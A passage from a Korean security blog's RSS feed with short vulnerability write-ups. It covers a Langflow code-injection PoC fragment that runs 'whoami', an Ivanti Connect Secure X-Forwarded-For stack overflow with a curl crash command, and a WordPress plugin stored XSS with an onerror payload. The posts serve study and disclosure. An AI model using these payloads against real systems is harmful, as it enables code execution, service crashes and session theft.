Exception(__import__(&quot;subprocess&quot;).check_output(&quot;whoami&quot;, shell=True))&apos;)):</span><span class="hljs-string">    pass</span><span class="hljs-string">&quot;&quot;&quot;</span>  <span class="hljs-comment"># [5] </span>            }                        print(<span class="hljs-string">f&quot;<span class="hljs-subst">{Fore.YELLOW}</span>[*] Testing endpoint: <span class="hljs-subst">{validate_url}</span>&quot;</span>)            response = self.session.post(                validate_url,                 json=payload,                 timeout=self.timeout            )  ...</code></pre><p>&#xC5EC;&#xB2F4;&#xC774;&#xC9C0;&#xB9CC;, &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xB85C; Preauth &#xCDE8;&#xC57D;&#xC810;&#xAE4C;&#xC9C0;&#xB294; &#xB9C9;&#xD614;&#xB354;&#xB77C;&#xB3C4;, python &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAD6C;&#xC870;&#xB294; &#xC5EC;&#xC804;&#xD558;&#xAE30;&#xC5D0; Account Takeover &#xB098; &#xC138;&#xC158; &#xD0C8;&#xCDE8;&#xC640; &#xAC19;&#xC740; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5F0;&#xACC4;&#xD55C;&#xB2E4;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC7AC;&#xBC1C;&#xD604; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xB124;&#xC694;. &#x1F625;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://github.com/xuemian168/CVE-2025-3248/">https://github.com/xuemian168/CVE-2025-3248/</a></p></li><li><p><a href="https://github.com/langflow-ai/langflow">https://github.com/langflow-ai/langflow</a></p></li><li><p><a href="https://github.com/langflow-ai/langflow/pull/6911/commits/dbae45f5717b9bf0f3096fce7399851aba27e658">https://github.com/langflow-ai/langflow/pull/6911/commits/dbae45f5717b9bf0f3096fce7399851aba27e658</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/LangFlow/">LangFlow</category>
      
      <category domain="https://hackyboiz.github.io/tags/code-injection/">code injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/AI/">AI</category>
      
      <category domain="https://hackyboiz.github.io/tags/AI-Agent/">AI Agent</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-3248/">CVE-2025-3248</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/13/mungsul/2025-04-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-22457: Ivanti Connect Secure의 X-Forwarded-For Stack Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/10/j0ker/2025-04-10/</link>
      <guid>https://hackyboiz.github.io/2025/04/10/j0ker/2025-04-10/</guid>
      <pubDate>Thu, 10 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://labs.watchtowr.com/is-the-sofistication-in-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://labs.watchtowr.com/is-the-sofistication-in-the-room-with-us-x-forwarded-for-and-ivanti-connect-secure-cve-2025-22457/">Is The Sofistication In The Room With Us? - X-Forwarded-For and Ivanti Connect Secure (CVE-2025-22457)</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Connect Secure &lt;= 22.7R2.5</li><li>Pulse Connect Secure (EOS) &lt;= 9.1R18.9</li><li>Ivanti Policy Secure &lt;= 22.7R1.3</li><li>ZTA Gateways &lt;= 22.8R2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti Connect Secure&#xB294; &#xAE30;&#xC5C5; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xACBD;&#xACC4;&#xC5D0;&#xC11C; VPN &#xC811;&#xC18D; &#xBC0F; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; SSL VPN &#xC7A5;&#xBE44;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC7A5;&#xBE44;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xACA9; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE)&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;(CVE-2025-22457)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>web</code> &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC758; HTTP &#xC694;&#xCCAD; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;, &#xD2B9;&#xD788; <code>WebRequest::dispatchRequest</code> &#xD568;&#xC218;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. [Source 37, 42] &#xC774; &#xB85C;&#xC9C1;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC124;&#xC815; &#xAC00;&#xB2A5;&#xD55C; <code>CUSTOM_IP_FIELD</code> &#xAD6C;&#xC131; &#xAC12;&#xC5D0; &#xC9C0;&#xC815;&#xB41C; HTTP &#xD5E4;&#xB354; (&#xAE30;&#xBCF8;&#xAC12;: <code>X-Forwarded-For</code>)&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB294; &#xD574;&#xB2F9; &#xD5E4;&#xB354; &#xAC12;&#xC744; &#xBC1B;&#xC544; <code>strspn</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC12; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0; &#xC22B;&#xC790;(<code>0-9</code>)&#xC640; &#xB9C8;&#xCE68;&#xD45C;(<code>.</code>)&#xB85C;&#xB9CC; &#xAD6C;&#xC131;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;(<code>ipLen</code>)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4;, <code>alloca</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>ipLen + 2</code> &#xD06C;&#xAE30;&#xC758; &#xBC84;&#xD37C;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xACE0;, <code>strlcpy</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD5E4;&#xB354; &#xAC12;&#xC758; &#xC77C;&#xBD80;(<code>ipLen + 1</code> &#xBC14;&#xC774;&#xD2B8;)&#xB97C; &#xC774; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">headerValue = httpHeader-&gt;Value;ipLen = <span class="hljs-built_in">strspn</span>(headerValue, <span class="hljs-string">&quot;0123456789.&quot;</span>);v58 = alloca(ipLen + <span class="hljs-number">2</span>); strlcpy(&amp;v178, *(_DWORD *)&amp;v176[<span class="hljs-number">4</span>], ipLen + <span class="hljs-number">1</span>);strlcpy(s, headerValue, ipLen + <span class="hljs-number">1</span>);</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xB294; <code>X-Forwarded-For</code> &#xD5E4;&#xB354;&#xC5D0; &#xC22B;&#xC790;&#xC640; &#xB9C8;&#xCE68;&#xD45C;&#xB85C;&#xB9CC; &#xAD6C;&#xC131;&#xB41C; &#xB9E4;&#xC6B0; &#xAE34; &#xAC12;&#xC744; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; HTTP &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; <code>ipLen</code> &#xAC12;&#xC774; &#xB9E4;&#xC6B0; &#xCEE4;&#xC9C0;&#xAC8C; &#xB418;&#xACE0;, <code>alloca</code> &#xD568;&#xC218;&#xAC00; &#xC2A4;&#xD0DD;&#xC5D0; &#xACFC;&#xB3C4;&#xD558;&#xAC8C; &#xD070; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xAC70;&#xB098; <code>strlcpy</code> &#xD568;&#xC218;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;&#xC758; &#xACBD;&#xACC4;&#xB97C; &#xB118;&#xC5B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; <code>web</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Ivanti&#xB294; &#xCC98;&#xC74C;&#xC5D0; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC22B;&#xC790;&#xC640; &#xB9C8;&#xCE68;&#xD45C;&#xB85C;&#xB9CC; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xC2E4;&#xC81C; RCE&#xB098; DoS&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC73C;&#xB098;, &#xC774;&#xD6C4; &#x201C;&#xC815;&#xAD50;&#xD55C; &#xBC29;&#xBC95;(sophisticated means)&#x201D;&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xC81C; RCE &#xACF5;&#xACA9;&#xC5D0; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Mandiant&#xC5D0; &#xB530;&#xB974;&#xBA74; 2025&#xB144; 3&#xC6D4; &#xC911;&#xC21C;&#xBD80;&#xD130; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; &#xBC31;&#xB3C4;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xB370; &#xC774;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB824;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xAE34; <code>X-Forwarded-For</code> &#xD5E4;&#xB354;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">curl -k https://&lt;TARGET_IP&gt;/ --header <span class="hljs-string">&quot;X-Forwarded-For: 1111111111111111111111111111111111111111111111111111111111111111.1111...&quot;</span></code></pre><p>&#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; <code>web</code> &#xD504;&#xB85C;&#xC138;&#xC2A4; crash &#xB85C;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xD328;&#xCE58;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; HTTP 400 &#xC751;&#xB2F5;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/ivanti/">ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/connect-secure/">connect_secure</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-buffer-overflow/">stack_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/x-forwarded-for/">x-forwarded-for</category>
      
      <category domain="https://hackyboiz.github.io/tags/itw/">itw</category>
      
      <category domain="https://hackyboiz.github.io/tags/in-the-wild/">in the wild</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/10/j0ker/2025-04-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-0924: WP Activity Log의 Stored Cross-Site Scripting (XSS)취약점</title>
      <link>https://hackyboiz.github.io/2025/04/09/romi0x/1day1line0409/</link>
      <guid>https://hackyboiz.github.io/2025/04/09/romi0x/1day1line0409/</guid>
      <pubDate>Wed, 09 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-0924&quot;&gt;https://n</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0924">https://nvd.nist.gov/vuln/detail/CVE-2025-0924</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>WP Activity Log v5.2.2 &#xC774;&#xD558; &#xBAA8;&#xB4E0; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WP Activity Log&#xB294; &#xC6CC;&#xB4DC;&#xD504;&#xB808;&#xC2A4; &#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xD65C;&#xB3D9;&#xC744; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xCD94;&#xC801;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC778;&#xAE30; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC785;&#xB2C8;&#xB2E4;. &#xAD00;&#xB9AC;&#xC790; &#xBC0F; &#xBCF4;&#xC548; &#xB2F4;&#xB2F9;&#xC790;&#xB4E4;&#xC774; &#xC2DC;&#xC2A4;&#xD15C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xACFC; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>class-alert-manager.php</code>&#xC758; <code>LogCustomEvent()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xAC12;&#xC778; <code>message</code>&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xB370;, <code>sanitize_text_field()</code>&#xB9CC; &#xC801;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5B4; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">$message = <span class="hljs-keyword">isset</span>( $_POST[<span class="hljs-string">&apos;message&apos;</span>] ) ? sanitize_text_field( wp_unslash( $_POST[<span class="hljs-string">&apos;message&apos;</span>] ) ) : <span class="hljs-string">&apos;&apos;</span>;</code></pre><p>&#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xB41C; <code>sanitize_text_field()</code>&#xB294; <code>&lt;script&gt;</code>&#xC640; &#xAC19;&#xC740; &#xBA85;&#xBC31;&#xD55C; HTML &#xD0DC;&#xADF8;&#xB294; &#xC81C;&#xAC70;&#xD558;&#xC9C0;&#xB9CC;, HTML &#xC18D;&#xC131; &#xAE30;&#xBC18;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;(&#xC608;: <code>&lt;img onerror=alert(1)&gt;</code>)&#xAE4C;&#xC9C0;&#xB294; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xCC98;&#xB9AC;&#xB41C; <code>message</code> &#xAC12;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>TriggerCustomEvent()</code>&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xACE0;(alert)&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xBA70;, &#xC774;&#xD6C4; <code>class-alert.php</code>&#xC758; <code>GetMessage()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xB2E4;&#xC2DC; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetMessage</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_message;</code></pre><p><code>$this-&gt;_message</code>&#xB294; DB&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xB2F4;&#xAE34; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xC774; &#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; <strong>escaping &#xC5C6;&#xC774; &#xADF8;&#xB300;&#xB85C; HTML&#xC5D0; &#xC0BD;&#xC785;</strong>&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;div class=&quot;log-entry&quot;&gt;&apos;</span> . $alert-&gt;GetMessage() . <span class="hljs-string">&apos;&lt;/div&gt;&apos;</span>;</code></pre><p>&#xC774;&#xCC98;&#xB7FC; &#xCD9C;&#xB825; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <code>esc_html()</code> &#xB610;&#xB294; <code>wp_kses()</code> &#xB4F1; &#xC801;&#xC808;&#xD55C; escaping &#xCC98;&#xB9AC;&#xAC00; &#xB204;&#xB77D;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xB85C;&#xADF8;&#xB97C; &#xC5F4;&#xB78C;&#xD558;&#xB294; &#xAD00;&#xB9AC;&#xC790; &#xB610;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/WordPress/">WordPress</category>
      
      <category domain="https://hackyboiz.github.io/tags/WP-Activity-Log/">WP Activity Log</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/09/romi0x/1day1line0409/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
